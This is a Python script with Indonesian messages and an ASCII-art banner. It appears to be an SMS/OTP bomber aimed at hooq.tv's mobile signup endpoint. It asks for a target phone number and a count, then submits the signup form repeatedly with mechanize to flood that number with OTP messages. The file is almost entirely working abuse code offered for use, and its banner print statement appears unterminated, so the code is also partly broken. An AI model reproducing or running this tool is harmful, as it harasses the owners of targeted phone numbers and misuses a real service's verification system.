try:
	import mechanize,os,sys,time
	
	print("""\033[97m
                        .:+ooooooo++ooooooo+:.                        
                   ./ooo/-`                `-/ooo/.                   
                :os+-                            .+ss:`               
             -ss:                                    :ss:             
          `+y/`                                        `/y+`          
         +y:                                              -y+`        
       :h:      .-          `....-..-...``          -.      :h:       
     `so     :ym+      `....-.` -`..`- `.-....`      omy:     oy`     
    .h:  -o-hMd.     .-.  ..`  .. .. ..  `..  .-.     -mMh-o-  :h.    
   -d.  oN-yd++`  `.. `..--`  `-  ..  -```.--.`` ..   `++my-M+  .d.   
  .d. :-Md.+sm:  ..    `-  ``.:./d+oNd-:``   -`    ..  :ms+.dM-: .d.  
 `d- oy/Mommo` `-`    `-     `. .+--Nm`.`     -`    `-` `omdoM/yo :d  
 oo -Mh:mh:+. `-.`    -      -    .s-  `-      -    `.-` .+/hm-hM. s+ 
`m` /Mm-+sNo  -  ``..--.``` `-    --    -`  ```--...`  -  oNs+-mM/ `m`
+s --Mm:NN/  -`      -   ```--....mm....--.```  -      `.  /NN:mM-- s/
h: h`sdmy.: `-      `-      .`   `--`   `.      -`      -  :.hmds`h :y
m` ms`do.d: ..      `.      -`.:/hddh/:``-      .`      .` :d.od`ym .d
N` hMs-:Nm` .-......--.....-ohM+ .mm. oMho-.....-.......-. `NN--sMh `m
m` -NM:dM/` `.      `./hmNMMMMN` .so. `MMMMMNmh:.`      .` `/Md:MN- .d
h: +-mhmy`h `-      `-MMMMMMMMN` `NN` `NMMMMMMMN-`      -  h`yddm-+ :y
+s yy.sN:/M- -`      +MMMMMMMMMo .MM. oMMMMMMMMM+      `. -M::Ns.yy s+
`m``mNo:-yM+  -  `...dMMMMMMMMMM/-MM./MMMMMMMMMMd...`` -  +My-:oNm``m`
 oo `yMN/sMo-+`-.`   mMMMMMMMMMMMhMMhMMMMMMMMMMMm    .-`+-oMs/NMy` so 
 `d- -:yNymh`Ny`-`  -MMMMMMMMMMMMMMMMMMMMMMMMMMMM.  `-`yN hmyNy:- :d  
  .d.`y+./oN-yMo .. oMMMMMMMMMMMMMMMMMMMMMMMMMMMMo .. oMy-No:.+y`.d.  
   -d.`oNds/:.NM:/:.hMMMMMMMMMMMMMMMMMMMMMMMMMMMMh.:/:MN.//sdNo .d.   
    .h: `+dMMdsdm.hdyMMMMMMMMMMMMMMMMMMMMMMMMMMMMydh.mdsdMMh+` :h.    
     `so  .::+syyd:yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy:dyys+::.  os`     
       :h: .ohhysssoohdNMMMMMMMMMMMMMMMMMMMMMMNdhoosssyhho. :h:       
         +y:  .+osyyys+//sMMMMMMMMMMMMMMMMMMs//+syyyso+.  :y+         
           +y/``:oysyhmMMMMMMMMMMMMMMMMMMMMMMMMmhysyo: `/y+`          
             -ss:``-:///:oMMMMMMMMMMMMMMMMMMo:///:-` :ss-             
                :os+-    oMMMMMMMMMMMMMMMMMMo    .+ss:                
                   ./ooo/hMMMMMMMMMMMMMMMMMMy/ooo/.                   
                        .:+syhdmNNMMNNmmdys+:.                        

	br = mechanize.Browser()
	br.set_handle_equiv(True)
	br.set_handle_gzip(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 8.1)")]
	
	def send(no):
		br.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7')
		br.select_form(nr=0)
		br.form["mobile"] = no
		br.form["password"] = "KangNewbieNoobea"
		res=br.submit().read()
		#print(res)
		if 'confirmotp' in str(res):
			print(i+1,"sukses mengirim OTP")
		else: print(i+1,"gagal mengirim OTP")
		#return True
	no=int(input("[?] Nomor target: "))
	jlm=int(input("[?] jumlah: "))
	print()
	if jlm > 20:
		exit("[!] kalo tidak mau script ini koid ngirimnya jangan banyak-banyak bosque")
	for i in range(jlm):
		send(str(no))
		time.sleep(1)
	
except KeyboardInterrupt: exit("[exit] key interrupt")
except Exception as F: print("Err: %s"%(F))
